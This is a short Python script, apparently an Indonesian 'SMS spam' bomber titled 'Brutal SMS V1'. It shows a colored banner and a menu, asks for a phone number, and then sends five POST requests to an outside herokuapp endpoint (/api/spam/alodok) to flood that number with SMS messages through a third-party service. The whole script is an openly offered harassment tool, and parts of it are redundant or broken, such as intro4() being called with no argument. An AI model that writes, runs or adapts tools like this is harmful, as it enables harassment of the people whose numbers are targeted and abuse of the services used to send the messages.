
import os,sys,time,re,requests,json
from requests import post
from time import sleep
def alodoc():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def alodoc1():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def alodoc2():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def alodoc3():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def alodoc4():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def intro(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro2(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro3(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro4(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
os.system('clear')
intro("""\033[1;96m╔╗ \033[1;37m┬─┐┬ ┬┌┬┐┌─┐┬    \033[1;96m╔═╗\033[1;37m╔╦╗╔═╗  
\033[1;96m╠╩╗\033[1;37m├┬┘│ │ │ ├─┤│    \033[1;96m╚═╗\033[1;37m║║║╚═╗   
\033[1;96m╚═╝\033[1;37m┴└─└─┘ ┴ ┴ ┴┴─┘  \033[1;96m╚═╝\033[1;37m╩ ╩╚═╝\033[1;33mV1""")
intro2("""\033[1;96m═══════════════════════════════════
\033[1;37m{\033[1;33m•\033[1;37m} \033[1;33mAuthor  :  \033[1;96mB4N9C4N
\033[1;37m{\033[1;33m•\033[1;37m} \033[1;33mYoutube :  \033[1;96mCANDRA - NM
\033[1;37m{\033[1;33m•\033[1;37m} \033[1;33mGithub  :  \033[1;96mgithub.com/B4N9C4N
\033[1;96m═══════════════════════════════════""")
time.sleep(1)
intro3("""\033[1;37m{\033[1;33m01\033[1;37m} > \033[1;33mSpam Sms
\033[1;37m{\033[1;33m00\033[1;37m} > \033[1;33mExit
\033[1;96m═══════════════════════════════════""")
nomor = input("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m Choice : \033[1;96m")
if nomor == "01":
     no = input("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m number : \033[1;96m")
     alodoc()
     alodoc1()
     alodoc2()
     alodoc3()
     alodoc4()
     intro4("Wait....")
     intro4()
     time.sleep(6)
     sys.exit()
else:
     sys.exit()

intro()
intro2()
intro3()
